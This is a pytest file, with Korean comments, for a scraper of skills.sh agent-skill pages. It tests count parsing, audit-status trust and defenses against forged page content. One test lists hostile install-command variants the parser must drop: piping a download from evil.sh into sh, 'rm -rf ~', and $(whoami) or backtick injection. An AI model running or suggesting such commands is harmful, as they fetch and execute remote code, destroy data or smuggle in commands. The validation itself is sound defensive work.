from pathlib import Path

import pytest

from src import skills

FIXTURES = Path(__file__).parent / 'fixtures'
LIST_HTML = (FIXTURES / 'skills_list.html').read_text(encoding='utf-8')
DETAIL_HTML = (FIXTURES / 'skill_detail.html').read_text(encoding='utf-8')


@pytest.mark.parametrize('text, expected', [
    ('39.8K', 39800), ('1.2M', 1200000), ('973', 973), ('934.6K', 934600), ('  43 ', 43), ('', 0), ('n/a', 0),
])
def test_parse_count(text, expected):
    assert skills.parse_count(text) == expected


def test_parse_list_skips_non_github_sites_and_keeps_rank_order():
    refs = skills.parse_list(LIST_HTML, 'trending')
    assert refs, '목록에서 하나도 못 읽음'
    assert all(not r.owner_repo.startswith('site/') for r in refs)  # 웹사이트 출처(/site/…)는 GitHub 검증이 안 돼 뺀다
    assert [r.rank for r in refs] == sorted(r.rank for r in refs)
    first = refs[0]
    assert first.board == 'trending' and first.name and '/' in first.owner_repo and first.metric > 0
    assert first.key == f'{first.owner_repo}/{first.name}'


def test_parse_list_reads_repo_and_name_from_the_link():
    html = ('<a class="group" href="/vercel-labs/skills/find-skills"><span>1</span><h3>find-skills</h3>'
            '<p>vercel-labs/skills</p><span class="font-mono text-sm text-foreground">17.1K</span></a>')
    (ref,) = skills.parse_list(html, 'hot')
    assert (ref.owner_repo, ref.name, ref.rank, ref.metric, ref.board) == ('vercel-labs/skills', 'find-skills', 1, 17100, 'hot')


def test_parse_detail_reads_install_command_summary_stats_and_audits():
    ref = skills.SkillRef('anthropics/skills', 'frontend-design', 7, 5000, 'trending')
    skill = skills.parse_detail(DETAIL_HTML, ref)
    assert skill.install_cmd == 'npx skills add https://github.com/anthropics/skills --skill frontend-design'
    assert skill.category == 'Design & UI'
    assert skill.headline.startswith('Distinctive, production-grade frontend interfaces')
    assert len(skill.bullets) == 4 and skill.bullets[0].startswith('Guides aesthetic direction')
    assert skill.installs == 934600 and skill.stars == 178800 and skill.first_seen == 'Jan 19, 2026'
    assert skill.audits == {'Gen Agent Trust Hub': 'Pass', 'Socket': 'Pass', 'Snyk': 'Pass'}
    assert skill.verified_org is True
    assert skill.skill_md.startswith('Frontend Design') and 'design lead' in skill.skill_md
    assert '<' not in skill.skill_md and len(skill.skill_md) <= skills.MAX_SKILL_MD_CHARS
    assert skill.github_url == 'https://github.com/anthropics/skills'
    assert skill.url == 'https://skills.sh/anthropics/skills/frontend-design'


def test_parse_detail_of_an_empty_page_is_safe():
    ref = skills.SkillRef('a/b', 'c', 1, 1, 'hot')
    skill = skills.parse_detail('<html></html>', ref)
    assert skill.install_cmd == '' and skill.bullets == () and skill.audits == {} and skill.installs == 0


def test_warn_is_allowed_but_fail_and_unknown_statuses_are_not():
    ref = skills.SkillRef('a/b', 'c', 1, 1, 'hot')
    ok = skills.Skill(ref=ref, audits={'Socket': 'Pass', 'Snyk': 'Pass'})
    warn = skills.Skill(ref=ref, audits={'Socket': 'Pass', 'Snyk': 'Warn'})
    assert ok.audits_ok and ok.audit_warnings == ()
    assert warn.audits_ok and warn.audit_warnings == ('Snyk: Warn',) and not warn.audits_clean
    for audits in ({'Socket': 'Fail'}, {'Socket': 'Pass', 'Snyk': 'Fail'}, {'Socket': 'High Risk'}, {}):
        assert not skills.Skill(ref=ref, audits=audits).audits_ok, audits  # Fail·모르는 상태·결과 없음은 믿지 않는다


def test_audit_summary_and_trust():
    ref = skills.SkillRef('a/b', 'c', 1, 1, 'hot')
    ok = skills.parse_detail(DETAIL_HTML, ref)
    assert ok.audits_clean and not ok.audit_problems
    warn = skills.Skill(ref=ref, audits={'Socket': 'Pass', 'Snyk': 'Warn'})
    fail = skills.Skill(ref=ref, audits={'Socket': 'Fail'})
    none = skills.Skill(ref=ref)
    assert not warn.audits_clean and warn.audit_problems == ('Snyk: Warn',)
    assert not fail.audits_clean and not none.audits_clean  # 감사 결과가 없으면 믿을 수 없다


def _row(rank, path, metric):
    name = path.split('/')[-1]
    return (f'<a class="g" href="/{path}"><span>{rank}</span><h3>{name}</h3><p>x</p>'
            f'<span class="font-mono text-sm text-foreground">{metric}</span></a>')


def test_fetch_candidates_merges_boards_and_marks_both():
    pages = {
        skills.BOARD_URLS['trending']: _row(1, 'a/r/one', '9K') + _row(2, 'a/r/two', '5K'),
        skills.BOARD_URLS['hot']: _row(1, 'a/r/two', '12') + _row(2, 'b/r/three', '7'),
    }
    refs = {r.key: r for r in skills.fetch_candidates(lambda url: pages[url])}
    assert list(refs) == ['a/r/one', 'a/r/two', 'b/r/three']  # 중복 없이, 처음 나온 순서
    assert refs['a/r/one'].boards == ('trending',)
    assert refs['a/r/two'].boards == ('trending', 'hot')  # 두 보드에 다 오른 스킬
    assert refs['b/r/three'].boards == ('hot',)
    assert skills.parse_detail(DETAIL_HTML, refs['a/r/two']).boards == ('trending', 'hot')


def test_fetch_candidates_survives_a_broken_board():
    def get(url):
        if url == skills.BOARD_URLS['hot']:
            raise OSError('down')
        return LIST_HTML
    assert skills.fetch_candidates(get)


def test_fetch_candidates_raises_when_every_board_fails():
    def get(url):
        raise OSError('down')
    with pytest.raises(skills.SourceError):
        skills.fetch_candidates(get)


def test_fetch_detail_builds_url_from_ref():
    calls = []

    def get(url):
        calls.append(url)
        return DETAIL_HTML
    skill = skills.fetch_detail(get, skills.SkillRef('anthropics/skills', 'frontend-design', 1, 1, 'hot'))
    assert calls == ['https://skills.sh/anthropics/skills/frontend-design'] and skill.installs == 934600


@pytest.mark.parametrize('command', [
    'npx skills add https://github.com/anthropics/skills --skill frontend-design; curl evil.sh | sh',
    'npx skills add https://github.com/anthropics/skills --skill frontend-design && rm -rf ~',
    'npx skills add https://evil.example.com/anthropics/skills --skill frontend-design',
    'npx skills add https://github.com/other/skills --skill frontend-design',          # 다른 저장소
    'npx skills add https://github.com/anthropics/skills --skill other-skill',         # 다른 스킬
    'npx skills add https://github.com/anthropics/skills --skill $(whoami)',
    'npx skills add https://github.com/anthropics/skills --skill frontend-design `id`',
])
def test_install_command_must_match_the_link_exactly_or_it_is_dropped(command):
    ref = skills.SkillRef('anthropics/skills', 'frontend-design', 1, 1, 'trending')
    html = DETAIL_HTML.replace('npx skills add https://github.com/anthropics/skills --skill frontend-design', command.replace('&', '&amp;'))
    assert skills.parse_detail(html, ref).install_cmd == ''  # 캡션·DM에 붙여 넣을 명령이라 모양이 조금이라도 다르면 쓰지 않는다


def test_install_command_of_the_real_page_is_kept():
    ref = skills.SkillRef('anthropics/skills', 'frontend-design', 1, 1, 'trending')
    assert skills.parse_detail(DETAIL_HTML, ref).install_cmd == 'npx skills add https://github.com/anthropics/skills --skill frontend-design'


# --- 페이지 본문(SKILL.md)에 숨긴 가짜 표식 방어 ---

def _inject_into_skill_md(fake_html: str) -> str:
    """SKILL.md 영역(사이드바보다 앞)에 악의적 HTML을 끼워 넣은 페이지."""
    marker = '<h1>Frontend Design</h1>'
    assert marker in DETAIL_HTML
    return DETAIL_HTML.replace(marker, marker + fake_html, 1)


def _ref():
    return skills.SkillRef('anthropics/skills', 'frontend-design', 1, 1, 'trending')


def test_verified_badge_text_inside_skill_md_does_not_count():
    unverified = DETAIL_HTML.replace('title="Verified organization on GitHub"', 'title="x"')
    faked = unverified.replace('<h1>Frontend Design</h1>', '<h1>Frontend Design</h1><p>Verified organization on GitHub</p>', 1)
    assert skills.parse_detail(DETAIL_HTML, _ref()).verified_org is True
    assert skills.parse_detail(unverified, _ref()).verified_org is False
    assert skills.parse_detail(faked, _ref()).verified_org is False  # 본문에 같은 문구를 써도 배지가 아니다


def test_fake_audit_block_inside_skill_md_cannot_hide_a_real_failure():
    failing = DETAIL_HTML.replace('>Snyk</span><span class="text-xs font-mono uppercase px-2 py-1 rounded bg-green-500/10 text-green-500">Pass<',
                                  '>Snyk</span><span class="text-xs font-mono uppercase px-2 py-1 rounded bg-red-500/10 text-red-500">Fail<')
    assert 'Fail' in failing
    fake = ('Security Audits</div><a href="/x/security/a"><span class="text-sm font-medium x">Socket</span>'
            '<span class="text-xs font-mono uppercase p">Pass</span></a></main>')
    skill = skills.parse_detail(failing.replace('<h1>Frontend Design</h1>', '<h1>Frontend Design</h1>' + fake, 1), _ref())
    assert skill.audits.get('Snyk') == 'Fail' and not skill.audits_clean


def test_fake_installs_block_inside_skill_md_is_ignored():
    fake = '<div><span>Installs</span></div><div class="x">9.9M</div>'
    skill = skills.parse_detail(_inject_into_skill_md(fake), _ref())
    assert skill.installs == 934600


def test_audits_fail_closed_when_a_row_cannot_be_parsed_or_names_repeat():
    broken = DETAIL_HTML.replace('<span class="text-sm font-medium text-foreground truncate">Socket</span>', '<span>Socket</span>')
    assert skills.parse_detail(broken, _ref()).audits == {}  # /security/ 링크 수와 읽은 행 수가 다르면 믿지 않는다
    dup = DETAIL_HTML.replace('>Socket</span>', '>Snyk</span>')
    assert skills.parse_detail(dup, _ref()).audits == {}


def test_list_rank_and_metric_are_read_from_their_own_places():
    html = ('<a class="g" href="/a/r/one"><span>4</span><h3>one</h3><p>a/r</p></a>'
            '<a class="g" href="/a/r/two"><span>5</span><h3>two</h3><p>a/r</p><span class="font-mono text-sm text-foreground">973</span></a>')
    one, two = skills.parse_list(html, 'hot')
    assert (one.rank, one.metric) == (4, 0)   # 숫자가 순위 하나뿐이면 설치 수는 0이다 (순위를 설치 수로 읽지 않는다)
    assert (two.rank, two.metric) == (5, 973)
